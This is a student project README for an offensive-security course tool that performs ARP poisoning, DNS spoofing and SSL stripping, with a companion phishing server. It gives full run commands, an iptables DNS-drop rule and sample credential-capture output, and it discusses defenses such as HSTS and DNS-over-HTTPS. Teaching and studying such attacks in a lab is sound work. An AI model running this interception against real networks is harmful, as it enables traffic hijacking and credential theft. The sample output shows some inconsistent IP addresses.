# 2IC80 Final Project - Group 28
By Sotiris Charalampopoulos (1785117), Nanda Potters (1983881), and Stefan Birca (1924818).

The current version is for the final deliverable.

This project implements a Man-in-the-Middle (MITM) attack tool combining ARP Poisoning, DNS Spoofing, and SSL Stripping capabilities. It includes a separate phishing server for credential harvesting demonstrations.

## Project Structure
```
├── mitm_spoofer.py      # Main MITM attack tool (ARP + DNS + SSL Strip)
├── phishing_server.py   # Standalone phishing login page server
└── README.md            # This file
```

## Requirements
- Python 3.x
- Scapy (`pip3 install scapy`)
- dnspython (`pip3 install dnspython`)
- Root privileges (sudo)
- Two devices on the same network (attacker and victim)

## Dependent Global Variables
| Variable | Description |
|----------|-------------|
| **ATTACKER_IP** | IP address of the attacker's machine (auto-detected from interface) |
| **VICTIM_IP** | IP address of the target victim (provided via `--target` flag) |
| **SERVER_IP** | IP address of the attacker's server to redirect to (provided via `--server` flag) |
| **INTERFACE** | Network interface to use (provided via `--interface` flag) |
| **GATEWAY_IP** | IP address of the network gateway (auto-detected) |
| **MODE** | Attack mode: `SILENT` or `ALL_OUT` (provided via `--mode` flag) |
| **SPOOF_MAP** | Domain-to-IP mappings for targeted DNS spoofing (SILENT mode only) |
| **UPSTREAM_DNS** | DNS server used by proxy to resolve real IPs (default: 8.8.8.8) |
| **SSL_STRIP_PORT** | Port for SSL stripping proxy (default: 8080) |

## Attack Modes
| Mode | DNS Spoofing | ARP Timing | Use Case |
|------|--------------|------------|----------|
| **SILENT** | Targeted (SPOOF_MAP only) | Slow (4 seconds) | Stealthy, specific targets |
| **ALL_OUT** | All DNS queries | Fast (0.5 seconds) | Aggressive, full interception |

## How the Attack Works

### 1. ARP Poisoning
The attacker sends forged ARP replies to both the victim and the gateway:
- Tells victim: "I am the gateway" (attacker's MAC, gateway's IP)
- Tells gateway: "I am the victim" (attacker's MAC, victim's IP)

This positions the attacker in the middle of all traffic between victim and gateway.

### 2. DNS Spoofing
When the victim makes DNS queries:
- Attacker intercepts the DNS request
- Attacker sends a forged DNS response pointing to attacker's IP
- Legitimate DNS response from gateway is dropped via iptables

### 3. SSL Stripping
When victim visits HTTP websites:
- Traffic is redirected to attacker's proxy (port 8080) via iptables
- Proxy fetches content from real server (following HTTPS redirects)
- Proxy rewrites all HTTPS links to HTTP in the response
- Victim stays on HTTP while attacker speaks HTTPS to server
- All POST data (including credentials) is intercepted and logged

### 4. Phishing Server (Optional)
A separate fake login page.

## Usage

### Running the MITM Attack
```bash
sudo python3 mitm_spoofer.py --interface <interface> --mode <SILENT|ALL_OUT> --target <victim_ip> --server <server_ip>
```

**Examples:**
```bash
# ALL_OUT mode - spoof all DNS queries
sudo python3 mitm_spoofer.py --interface wlp0s20f3 --mode ALL_OUT --target 192.148.127.111 --server 

# SILENT mode - targeted spoofing (will prompt for domain)
sudo python3 mitm_spoofer.py --interface eth0 --mode SILENT --target 192.148.1.50 --server 
```

### Running the Phishing Server (Separate Terminal)
```bash
sudo python3 phishing_server.py --port 80
```

**Options:**
```bash
# Custom port
python3 phishing_server.py --port 8080

# Specify allowed network
sudo python3 phishing_server.py --port 80 --network 192.148.127.0/24
```

## Testing Procedure

### Setup
1. **Attacker machine:** Your laptop/computer running the attack tools
2. **Victim machine:** A separate device (VM, phone, or another computer) on the same network
3. **Disable DNS-over-HTTPS on victim's browser** (Firefox: `about:config` → `network.trr.mode` → `5`)

### Test 1: Basic MITM + Phishing

**Terminal 1 (Phishing Server):**
```bash
sudo python3 phishing_server.py --port 80
```
Output:
```
============================================================
    🎣 Phishing Server - Lab on Offensive Cyber Security
============================================================

    Server IP:      192.148.127.95
    Port:           80
    Allowed Network: 192.148.127.0/24

    URL: http://192.148.127.95/

============================================================
    Waiting for victims to connect...
    Press Ctrl+C to stop and view captured credentials
============================================================
```

**Terminal 2 (MITM Attack):**
```bash
sudo python3 mitm_spoofer.py --interface wlp0s20f3 --mode ALL_OUT --target 192.148.127.111
```
Output:
```
============================================================
    MITM Attack Tool - Offensive Cyber Security Lab
============================================================
[*] Mode: ALL_OUT
[*] Attacker: 192.148.127.95
[*] Victim: 192.148.127.111
[*] Interface: wlp0s20f3
[*] Gateway: 192.148.127.1 (aa:bb:cc:dd:ee:ff)
[*] Victim: 192.148.127.111 (11:22:33:44:55:66)
[*] IP Forwarding enabled
[A] IPTables: sudo iptables -A FORWARD -p udp -s 192.148.127.1 --sport 53 -d 192.148.127.111 -j DROP
[ARP] Poisoning started
[DNS] Spoofing started
[SSL Strip] iptables redirect port 80 -> 8080
[SSL Strip] Starting proxy on port 8080
[SSL] Stripping proxy started

============================================================
    Attack running. Ctrl+C to stop.
============================================================
```

**On Victim Device:**
1. Open browser and navigate to: `http://192.148.127.95/`
2. Enter credentials in the fake login form
3. Submit the form

**Attacker Terminal Output (Credentials Captured):**
```
 CREDENTIALS INTERCEPTED! 
    Host: 192.168.178.95
    Username: victim@example.com
    Password: secretpassword123
    Time: 14:32:45
    Victim: 192.168.178.111

### Test 2: SSL Stripping on HTTP Sites

**On Victim Device:**
1. Navigate to: `http://neverssl.com`
2. The page should load (proving HTTP interception works)

**Attacker Terminal Output:**
```
[DNS Spoof] Query: 'neverssl.com.' from 192.148.127.111
[DNS Spoof] SPOOFING: neverssl.com. -> 192.148.127.95
[SSL Strip] GET http://neverssl.com/
[SSL Strip] Resolved neverssl.com -> 34.223.124.45
[SSL Strip] ✓ Sent 2048 bytes
```

### Test 3: HSTS Protection Demonstration

**On Victim Device:**
1. Navigate to: `https://google.com`

**Attacker Terminal Output:**
```
[SSL Strip] ✗ CONNECT google.com - HSTS protected
[Analyzer] Direct HTTPS: google.com - Likely HSTS Preload
```

This demonstrates that HSTS preload protects against SSL stripping.

### Terminating the Attack
Press `Ctrl+C` in the MITM terminal:
```
[!] Shutting down...
[SSL Strip] Shutting down...

================================================================================
                 SSL STRIPPING FEASIBILITY ANALYSIS REPORT
================================================================================

 TRAFFIC SUMMARY:
   • Total HTTP requests: 5
   • HTTP→HTTPS upgrades detected: 1
   • Direct HTTPS attempts: 2
   • HTTPS links stripped: 12

 CAPTURED CREDENTIALS:
   • 14:32:45 - 192.148.127.95
     👤 Username: victim@example.com
     🔑 Password: secretpassword123

 ATTACK EFFECTIVENESS:
   • HSTS-protected sites: 1
   • Preload-protected sites: 2

================================================================================

[ARP Poison] ARP tables restored.
[D] IPTables: sudo iptables -D FORWARD -p udp -s 192.148.127.1 --sport 53 -d 192.148.127.111 -j DROP
[*] Cleanup complete
```

## Limitations and Modern Defenses

### Why SSL Stripping is Less Effective Today
1. **HSTS Preload Lists:** Major sites (Google, Facebook, Twitter) are hardcoded in browsers to always use HTTPS
2. **HSTS Headers:** Sites can tell browsers to always use HTTPS for future visits
3. **DNS-over-HTTPS (DoH):** Encrypts DNS queries, bypassing DNS spoofing
4. **Secure Cookies:** Cookies with `Secure` flag are not sent over HTTP

### What Still Works
- HTTP-only sites (rare today)
- First visit to sites with HSTS (before header is received)
- Sites not on HSTS preload list
- Phishing attacks using fake domains

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "Cannot find MAC addresses" | Ensure victim is online and on same network |
| DNS spoofing not working | Disable DNS-over-HTTPS on victim's browser |
| 502 errors in browser | Check if phishing server is running on port 80 |
| "Address already in use" | Wait a moment or use `sudo killall python3` |
| Interface not found | Run `ip addr` to list available interfaces |

## Disclaimer
This tool is developed for educational purposes as part of the 2IC80 Offensive Cyber Security course. It should only be used in controlled lab environments with explicit permission. Unauthorized use of this tool against networks or systems you do not own or have permission to test is illegal.
